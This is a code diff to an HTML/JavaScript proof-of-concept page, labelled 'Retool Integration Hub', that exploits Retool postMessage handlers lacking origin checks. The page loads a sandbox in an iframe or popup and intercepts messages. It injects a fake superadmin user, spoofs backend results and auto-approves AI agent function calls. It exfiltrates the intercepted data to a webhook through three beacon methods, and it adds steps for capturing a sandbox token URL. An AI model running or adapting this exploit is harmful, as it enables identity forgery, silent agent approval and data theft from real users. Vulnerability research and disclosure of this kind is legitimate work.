@@ -12,7 +12,7 @@
   .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
   .dot.g { background: #4ade80; } .dot.y { background: #fbbf24; animation: pulse 1s infinite; } .dot.r { background: #ef4444; }
   @keyframes pulse { 50% { opacity: 0.5; } }
-  .ctr { max-width: 750px; margin: 30px auto; padding: 0 20px; }
+  .ctr { max-width: 800px; margin: 30px auto; padding: 0 20px; }
   .card { background: #fff; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; overflow: hidden; margin-bottom: 16px; }
   .ch { padding: 14px 20px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px; }
   .cb { padding: 16px 20px; }
@@ -20,22 +20,24 @@
   .row .l { color: #64748b; } .row .v { font-weight: 500; font-family: monospace; font-size: 12px; }
   .badge { padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
   .badge.g { background: #dcfce7; color: #16a34a; } .badge.y { background: #fef3c7; color: #d97706; } .badge.r { background: #fef2f2; color: #dc2626; }
-  .btn { padding: 10px 22px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; }
-  .btn-b { background: #3b82f6; color: #fff; } .btn-r { background: #ef4444; color: #fff; } .btn-g { background: #16a34a; color: #fff; }
+  .btn { padding: 10px 22px; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; border: none; display: inline-block; }
+  .btn-b { background: #3b82f6; color: #fff; } .btn-r { background: #ef4444; color: #fff; } .btn-g { background: #16a34a; color: #fff; margin-top: 4px; }
   .hidden { display: none !important; }
-  .log { background: #1e293b; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.7; max-height: 300px; overflow-y: auto; }
+  .log { background: #1e293b; color: #e2e8f0; padding: 10px 14px; border-radius: 8px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; line-height: 1.7; max-height: 320px; overflow-y: auto; }
   .log .i { color: #fbbf24; } .log .j { color: #f87171; } .log .x { color: #4ade80; } .log .n { color: #94a3b8; } .log .e { color: #ef4444; }
   .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
   .stat { text-align: center; padding: 10px; } .stat .n { font-size: 32px; font-weight: 700; } .stat .t { font-size: 11px; color: #64748b; text-transform: uppercase; }
   input[type=text] { width: 100%; padding: 8px 12px; border: 1px solid #e2e8f0; border-radius: 6px; font-family: monospace; font-size: 13px; }
   .err { background: #fef2f2; border: 1px solid #fecaca; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #991b1b; margin-top: 8px; }
   .ok { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 10px 14px; border-radius: 6px; font-size: 12px; color: #16a34a; margin-top: 8px; }
+  .steps { font-size: 13px; } .steps li { margin-bottom: 6px; }
+  code { background: #f1f5f9; padding: 1px 5px; border-radius: 3px; font-size: 12px; }
 </style>
 </head>
 <body>
 <div class="topbar">
   <span class="logo">Retool Integration Hub</span>
-  <span><span class="dot y" id="topDot"></span> <span id="topLabel" style="font-size:13px;">Loading...</span></span>
+  <span><span class="dot y" id="topDot"></span> <span id="topLabel" style="font-size:13px;">Ready</span></span>
 </div>
 
 <div class="ctr">
@@ -46,16 +48,28 @@
     <div class="card stat"><div class="n" id="cX">0</div><div class="t">Exfiltrated</div></div>
   </div>
 
+  <!-- HOW TO FIND SANDBOX URL -->
+  <div class="card">
+    <div class="ch">Step 1: Find your retool sandbox URL</div>
+    <div class="cb">
+      <ol class="steps">
+        <li>Open your retool editor: <code>https://jonjos11.retool.com/apps/272a0bca-c978-11ef-bcec-bb34712e5ec6</code></li>
+        <li>Open <b>DevTools</b> (F12) → <b>Network</b> tab</li>
+        <li>In the filter box, type: <code>sandbox</code> or <code>agent-vite</code></li>
+        <li>Look for an iframe request like: <code>/sandbox/.../agent-vite?sandboxToken=...</code></li>
+        <li>Right-click it → <b>Copy URL</b></li>
+        <li>Paste it below</li>
+      </ol>
+    </div>
+  </div>
+
   <!-- CONFIG -->
   <div class="card">
-    <div class="ch">Configuration</div>
+    <div class="ch">Step 2: Configure &amp; Launch</div>
     <div class="cb">
       <div style="margin-bottom:10px;">
-        <label style="font-size:12px;font-weight:600;">Target (retool sandbox URL)</label>
-        <input type="text" id="inpUrl" value="https://jonjos11.retool.com">
-        <div style="font-size:10px;color:#94a3b8;margin-top:2px;">
-          Use the sandbox/preview URL: /sandbox/ID/agent-vite or /_/rr/app/ID
-        </div>
+        <label style="font-size:12px;font-weight:600;">Sandbox URL (from Step 1)</label>
+        <input type="text" id="inpUrl" placeholder="https://jonjos11.retool.com/sandbox/272a0bca-c978-11ef-bcec-bb34712e5ec6/agent-vite?sandboxToken=...">
       </div>
       <div style="margin-bottom:10px;">
         <label style="font-size:12px;font-weight:600;">Webhook</label>
@@ -64,10 +78,11 @@
       <div id="elStatus"></div>
       <div id="elErr" class="err hidden"></div>
       <div id="elOk" class="ok hidden"></div>
-      <div style="margin-top:12px; display:flex; gap:8px;">
-        <span class="btn btn-b" id="btnGo">Load Target</span>
-        <span class="btn btn-r" id="btnRe">Reload</span>
+      <div style="margin-top:12px; display:flex; gap:8px; flex-wrap:wrap;">
+        <span class="btn btn-b" id="btnGo">Load Sandbox in Iframe</span>
+        <span class="btn btn-b" id="btnPopup">Open Sandbox as Popup</span>
         <span class="btn btn-g" id="btnTest">Test Webhook</span>
+        <span class="btn btn-r" id="btnRe">Reset</span>
       </div>
     </div>
   </div>
@@ -86,15 +101,10 @@
 (function() {
   'use strict';
 
-  var cntI = 0, cntJ = 0, cntX = 0;
-  var W = document.getElementById('inpWh').value;
-  var T = document.getElementById('inpUrl').value;
+  var cntI = 0, cntJ = 0, cntX = 0, popupRef = null;
   var F = document.getElementById('f');
   var LOG = document.getElementById('logBox');
 
-  // ============================================================
-  // LOGGING
-  // ============================================================
   function L(msg, cls) {
     var t = new Date().toLocaleTimeString('en-US', { hour12: false });
     var d = document.createElement('div');
@@ -110,56 +120,46 @@
     document.getElementById('cJ').textContent = cntJ;
     document.getElementById('cX').textContent = cntX;
     document.getElementById('elLogCnt').textContent = cntI + ' events';
-    document.getElementById('topDot').className = cntI > 0 ? 'dot g' : (F.src ? 'dot y' : 'dot r');
-    document.getElementById('topLabel').textContent = cntI > 0 ? cntI + ' messages intercepted' : (F.src ? 'Waiting...' : 'Not loaded');
+    var loaded = !!(F.src || popupRef);
+    document.getElementById('topDot').className = cntI > 0 ? 'dot g' : (loaded ? 'dot y' : 'dot r');
+    document.getElementById('topLabel').textContent = cntI > 0 ? cntI + ' messages intercepted' : (loaded ? 'Waiting for messages...' : 'Ready');
   }
 
   // ============================================================
-  // EXFILTRATION (3 methods — all avoid CORS preflight)
+  // EXFILTRATION
   // ============================================================
   function X(payload) {
     var json = JSON.stringify(payload);
     var wh = document.getElementById('inpWh').value;
 
-    // Method 1: Regular fetch (webhook.site supports CORS)
-    try {
-      fetch(wh, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: json
-      }).then(function(r) {
-        if (r.ok) L('EXFIL: fetch OK (' + r.status + ')', 'x');
-        else L('EXFIL: fetch FAIL (' + r.status + ')', 'e');
-      }).catch(function(e) {
-        L('EXFIL: fetch error: ' + e.message, 'e');
-      });
-    } catch(e) {
-      L('EXFIL: fetch threw: ' + e.message, 'e');
-    }
+    // Regular fetch (webhook.site supports CORS)
+    fetch(wh, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: json
+    }).then(function(r) {
+      L('EXFIL: fetch ' + (r.ok ? 'OK(' + r.status + ')' : 'FAIL(' + r.status + ')'), r.ok ? 'x' : 'e');
+    }).catch(function(e) {
+      L('EXFIL: fetch error — ' + e.message, 'e');
+    });
 
-    // Method 2: sendBeacon
+    // sendBeacon
     if (navigator.sendBeacon) {
       try {
         var blob = new Blob([json], { type: 'text/plain' });
-        var ok = navigator.sendBeacon(wh, blob);
-        L('EXFIL: sendBeacon ' + (ok ? 'queued' : 'failed'), ok ? 'x' : 'e');
-      } catch(e) {
-        L('EXFIL: sendBeacon error: ' + e.message, 'e');
-      }
+        navigator.sendBeacon(wh, blob);
+        L('EXFIL: sendBeacon queued', 'x');
+      } catch(e) {}
     }
 
-    // Method 3: Image (appended to DOM for reliability)
+    // Image beacon (appended to DOM)
     try {
-      var q = '?d=' + encodeURIComponent(json.slice(0, 800));
       var img = document.createElement('img');
       img.style.display = 'none';
-      img.src = wh + q;
+      img.src = wh + '?d=' + encodeURIComponent(json.slice(0, 800));
       document.body.appendChild(img);
-      setTimeout(function() { document.body.removeChild(img); }, 1000);
-      L('EXFIL: image beacon sent', 'x');
-    } catch(e) {
-      L('EXFIL: image error: ' + e.message, 'e');
-    }
+      setTimeout(function() { if (img.parentNode) img.parentNode.removeChild(img); }, 500);
+    } catch(e) {}
 
     cntX++;
     U();
@@ -168,7 +168,7 @@
   // ============================================================
   // INJECTIONS
   // ============================================================
-  function injectUser() {
+  function injectUser(target) {
     var fakeUser = {
       id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
       fullName: 'Hacked Admin', profilePhotoUrl: null,
@@ -176,116 +176,151 @@
       metadata: { role: 'superadmin', _poc: true },
       sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
     };
-
-    try {
-      F.contentWindow.postMessage({ type: 'RETOOL_CURRENT_USER', data: fakeUser }, '*');
-    } catch(e) {}
-
+    try { target.postMessage({ type: 'RETOOL_CURRENT_USER', data: fakeUser }, '*'); } catch(e) {}
     cntJ++;
-    L('INJECT: Fake RETOOL_CURRENT_USER → ' + fakeUser.email + ' (admin groups)', 'j');
+    L('INJECT: Fake RETOOL_CURRENT_USER → ' + fakeUser.email, 'j');
     X({ event: 'inject_user', injected: fakeUser.email, groups: fakeUser.groups, time: new Date().toISOString() });
     U();
   }
 
-  function spoofResult(rid, fname) {
+  function spoofResult(target, rid, fname) {
     try {
-      F.contentWindow.postMessage({
+      target.postMessage({
         type: 'RETOOL_BACKEND_RESULT', requestId: rid,
         data: { _spoofed: true, _attacker: 'postMessage wildcard exploit', timestamp: new Date().toISOString() }
       }, '*');
     } catch(e) {}
-
     cntJ++;
     L('INJECT: Spoofed RETOOL_BACKEND_RESULT → ' + fname, 'j');
     U();
   }
 
   // ============================================================
-  // INTERCEPTION
+  // INTERCEPTION — from iframe
   // ============================================================
   window.addEventListener('message', function(e) {
-    if (e.source !== F.contentWindow) return;
+    // Accept messages from iframe OR popup
+    var isFromFrame = F.contentWindow && e.source === F.contentWindow;
+    var isFromPopup = popupRef && e.source === popupRef;
+    if (!isFromFrame && !isFromPopup) return;
+
     var d = e.data;
     if (!d || typeof d !== 'object' || !d.type) return;
 
+    var src = isFromFrame ? 'iframe' : 'popup';
     cntI++;
     U();
 
+    var target = isFromFrame ? F.contentWindow : popupRef;
+
     if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      L('INTERCEPT: RETOOL_CURRENT_USER_REQUEST (retol.js:7051 → "*")', 'i');
-      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, time: new Date().toISOString(), note: 'App requesting user identity via wildcard' });
-      setTimeout(injectUser, 200);
+      L('INTERCEPT [' + src + ']: RETOOL_CURRENT_USER_REQUEST (→ "*")', 'i');
+      L('  origin: ' + e.origin, 'n');
+      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', source: src, origin: e.origin, time: new Date().toISOString() });
+      setTimeout(function() { injectUser(target); }, 200);
     }
     else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      L('INTERCEPT: RETOOL_BACKEND_FUNCTION — ' + d.functionName, 'i');
+      L('INTERCEPT [' + src + ']: RETOOL_BACKEND_FUNCTION — ' + d.functionName, 'i');
       L('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'n');
       L('  requestId: ' + d.requestId, 'n');
-      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString(), note: 'Backend function call leaked' });
-      setTimeout(function() { spoofResult(d.requestId, d.functionName); }, 200);
+      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', source: src, functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
+      setTimeout(function() { spoofResult(target, d.requestId, d.functionName); }, 200);
     }
     else if (d.type === 'RETOOL_BACKEND_AGENT_FUNCTION') {
-      L('INTERCEPT: RETOOL_BACKEND_AGENT_FUNCTION — ' + d.functionName, 'i');
-      X({ event: 'intercept', type: 'RETOOL_BACKEND_AGENT_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, time: new Date().toISOString(), note: 'AI agent function intercepted' });
+      L('INTERCEPT [' + src + ']: RETOOL_BACKEND_AGENT_FUNCTION — ' + d.functionName, 'i');
+      L('  params: ' + JSON.stringify(d.params || {}).slice(0, 250), 'n');
+      X({ event: 'intercept', type: 'RETOOL_BACKEND_AGENT_FUNCTION', source: src, functionName: d.functionName, params: d.params, requestId: d.requestId, time: new Date().toISOString() });
       setTimeout(function() {
-        try { F.contentWindow.postMessage({ type: 'RETOOL_BACKEND_APPROVAL', requestId: d.requestId, approved: true }, '*'); } catch(e) {}
+        try { target.postMessage({ type: 'RETOOL_BACKEND_APPROVAL', requestId: d.requestId, approved: true }, '*'); } catch(e) {}
         cntJ++; L('INJECT: Approved agent function ' + d.requestId, 'j'); U();
       }, 200);
     }
-    else if (d.type.indexOf('RETOOL_') === 0) {
-      L('INTERCEPT: ' + d.type, 'i');
-      X({ event: 'intercept', type: d.type, data: d, time: new Date().toISOString() });
+    else if (d.type && d.type.indexOf('RETOOL_') === 0) {
+      L('INTERCEPT [' + src + ']: ' + d.type, 'i');
+      X({ event: 'intercept', type: d.type, source: src, data: d, time: new Date().toISOString() });
     }
-
     U();
   });
 
   // ============================================================
-  // LOAD TARGET
+  // LOAD SANDBOX IN IFRAME
   // ============================================================
-  function loadTarget() {
-    T = document.getElementById('inpUrl').value.trim();
-    W = document.getElementById('inpWh').value.trim();
+  function loadIframe() {
+    var url = document.getElementById('inpUrl').value.trim();
+    if (!url) { L('ERROR: No sandbox URL. Find it via Step 1 above.', 'e'); return; }
 
-    if (!T) { L('ERROR: No target URL', 'e'); return; }
-
-    F.src = T;
+    F.src = url;
     document.getElementById('elStatus').innerHTML = '<span class="badge y">Loading iframe...</span>';
     document.getElementById('elErr').classList.add('hidden');
     document.getElementById('elOk').classList.add('hidden');
 
-    L('LOAD: Embedding → ' + T, 'n');
-    L('WEBHOOK: ' + W, 'n');
+    L('LOAD: Embedding sandbox in iframe...', 'n');
+    L('URL: ' + url.slice(0, 120) + '...', 'n');
     L('', 'n');
-    L('VULNERABLE HANDLERS (no origin check):', 'n');
-    L('  RETOOL_CURRENT_USER       → retol.js:7043', 'n');
-    L('  RETOOL_BACKEND_RESULT     → retol.js:6800', 'n');
-    L('  RETOOL_AUTH_COMPLETE      → retol.js:7751', 'n');
-    L('WILDCARD postMessage targets ("*"):', 'n');
-    L('  RETOOL_CURRENT_USER_REQUEST → retol.js:7051', 'n');
-    L('  RETOOL_BACKEND_FUNCTION     → retol.js:6833', 'n');
+    L('VULNERABLE HANDLERS (no origin check in retol.js):', 'n');
+    L('  7043 — RETOOL_CURRENT_USER       → setUser(event.data.data)', 'n');
+    L('  6800 — RETOOL_BACKEND_RESULT     → resolve(event.data.data)', 'n');
+    L('  6949 — RETOOL_BACKEND_RESULT (V2)→ resolve(event.data.data)', 'n');
+    L('  7751 — RETOOL_AUTH_COMPLETE      → bypass auth gates', 'n');
+    L('', 'n');
+    L('WILDCARD postMessage sent to "*":', 'n');
+    L('  7051 — RETOOL_CURRENT_USER_REQUEST', 'n');
+    L('  6833 — RETOOL_BACKEND_FUNCTION', 'n');
+    L('  6979 — RETOOL_BACKEND_FUNCTION (V2)', 'n');
 
+    X({ event: 'heartbeat', targetUrl: url, pageUrl: window.location.href, referrer: document.referrer, userAgent: navigator.userAgent, time: new Date().toISOString() });
+    L('HEARTBEAT: Test beacon sent to webhook', 'x');
     U();
-
-    // Send heartbeat
-    L('', 'n');
-    L('Sending heartbeat to webhook...', 'x');
-    X({ event: 'heartbeat', targetUrl: T, pageUrl: window.location.href, referrer: document.referrer, userAgent: navigator.userAgent, time: new Date().toISOString() });
 
     F.onload = function() {
       document.getElementById('elStatus').innerHTML = '<span class="badge g">Iframe loaded</span>';
       document.getElementById('elOk').classList.remove('hidden');
-      document.getElementById('elOk').textContent = 'Iframe loaded! Waiting for retool postMessages. Check webhook.site — the heartbeat should have arrived by now.';
-      L('IFRAME: Loaded. Waiting for postMessages...', 'n');
+      document.getElementById('elOk').textContent = 'Sandbox loaded! Watch for intercepted postMessages above. Check webhook.site for exfiltrated data.';
+      L('IFRAME: Loaded. Listening for postMessages...', 'n');
       U();
     };
 
     F.onerror = function() {
-      document.getElementById('elStatus').innerHTML = '<span class="badge r">Blocked (X-Frame-Options?)</span>';
+      document.getElementById('elStatus').innerHTML = '<span class="badge r">Blocked</span>';
       document.getElementById('elErr').classList.remove('hidden');
-      document.getElementById('elErr').textContent = 'Iframe blocked. Target may refuse embedding. Try the sandbox URL (/sandbox/ID/agent-vite) or use window.open as fallback.';
-      L('ERROR: Iframe refused to load (X-Frame-Options / CSP)', 'e');
+      document.getElementById('elErr').textContent = 'Iframe blocked. Try "Open Sandbox as Popup" instead.';
+      L('ERROR: Iframe blocked (X-Frame-Options / CSP)', 'e');
       U();
     };
+  }
+
+  // ============================================================
+  // OPEN SANDBOX AS POPUP
+  // ============================================================
+  function openPopup() {
+    var url = document.getElementById('inpUrl').value.trim();
+    if (!url) { L('ERROR: No URL provided', 'e'); return; }
+
+    popupRef = window.open(url, 'retoolSandbox', 'width=1200,height=800');
+    if (!popupRef) { L('ERROR: Popup blocked by browser. Allow popups for this site.', 'e'); return; }
+
+    document.getElementById('elStatus').innerHTML = '<span class="badge y">Popup opened</span>';
+    L('POPUP: Opened sandbox in new window', 'n');
+
+    // Inject fake user after popup loads
+    setTimeout(function() {
+      try {
+        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER', data: {
+          id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
+          fullName: 'Hacked Admin', profilePhotoUrl: null,
+          groups: [{ id: 1, name: 'admin' }],
+          metadata: { role: 'superadmin', _poc: true },
+          sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
+        }}, '*');
+        cntJ++;
+        L('INJECT [popup]: Sent fake RETOOL_CURRENT_USER', 'j');
+        U();
+      } catch(e) { L('ERROR: postMessage to popup failed: ' + e.message, 'e'); }
+    }, 3000);
+
+    X({ event: 'popup_opened', targetUrl: url, time: new Date().toISOString() });
+    L('POPUP: Waiting for messages from popup...', 'n');
+    U();
   }
 
   // ============================================================
@@ -293,39 +328,33 @@
   // ============================================================
   function testWebhook() {
     var wh = document.getElementById('inpWh').value;
-    L('TEST: Sending test beacon to ' + wh, 'x');
+    L('TEST: Sending to ' + wh, 'x');
 
-    // Try fetch first (not no-cors — webhook.site supports CORS)
     fetch(wh, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ event: 'test_beacon', time: new Date().toISOString(), source: 'manual_test' })
     }).then(function(r) {
       if (r.ok) {
-        L('TEST: fetch SUCCESS (' + r.status + ') — webhook is reachable!', 'x');
+        L('TEST: SUCCESS (' + r.status + ') — webhook is receiving!', 'x');
         document.getElementById('elOk').classList.remove('hidden');
-        document.getElementById('elOk').textContent = 'Test succeeded! Webhook is receiving data.';
+        document.getElementById('elOk').textContent = 'Webhook works! Now find the sandbox URL and load it.';
       } else {
-        L('TEST: fetch returned ' + r.status, 'e');
+        L('TEST: FAIL (' + r.status + ')', 'e');
       }
     }).catch(function(e) {
-      L('TEST: fetch FAILED — ' + e.message, 'e');
+      L('TEST: FAIL — ' + e.message, 'e');
       L('TEST: Trying image beacon fallback...', 'n');
-
-      // Image fallback
       var img = document.createElement('img');
       img.style.display = 'none';
       img.src = wh + '?test=' + Date.now();
       document.body.appendChild(img);
-      setTimeout(function() { document.body.removeChild(img); }, 500);
-      L('TEST: Image beacon sent. Check webhook.site for GET request.', 'x');
+      setTimeout(function() { if (img.parentNode) img.parentNode.removeChild(img); }, 500);
+      L('TEST: Image beacon sent. Look for GET request in webhook.site.', 'x');
     });
 
-    // Also try sendBeacon
     if (navigator.sendBeacon) {
-      var blob = new Blob([JSON.stringify({ event: 'test_beacon', time: new Date().toISOString() })], { type: 'text/plain' });
-      navigator.sendBeacon(wh, blob);
-      L('TEST: sendBeacon queued', 'x');
+      navigator.sendBeacon(wh, new Blob([JSON.stringify({ event: 'test_beacon', time: new Date().toISOString() })], { type: 'text/plain' }));
     }
   }
 
@@ -333,23 +362,30 @@
   // BUTTONS
   // ============================================================
   document.getElementById('btnGo').addEventListener('click', function() {
-    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
-    loadTarget();
+    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = ''; popupRef = null;
+    loadIframe();
   });
-
+  document.getElementById('btnPopup').addEventListener('click', function() {
+    cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
+    openPopup();
+  });
+  document.getElementById('btnTest').addEventListener('click', testWebhook);
   document.getElementById('btnRe').addEventListener('click', function() {
     cntI = 0; cntJ = 0; cntX = 0; LOG.innerHTML = '';
     F.src = '';
-    setTimeout(loadTarget, 300);
+    if (popupRef) { try { popupRef.close(); } catch(e) {} popupRef = null; }
+    document.getElementById('elStatus').innerHTML = '';
+    document.getElementById('elErr').classList.add('hidden');
+    document.getElementById('elOk').classList.add('hidden');
+    L('Reset. Ready.', 'n');
+    U();
   });
-
-  document.getElementById('btnTest').addEventListener('click', testWebhook);
 
   // ============================================================
   // INIT
   // ============================================================
-  L('PoC ready. Enter retool sandbox URL and click "Load Target"', 'n');
-  L('Or click "Test Webhook" first to verify connectivity.', 'n');
+  L('Ready. Follow Step 1 to find your sandbox URL, then load it.', 'n');
+  L('Use "Test Webhook" first to verify connectivity.', 'n');
   U();
 
 })();
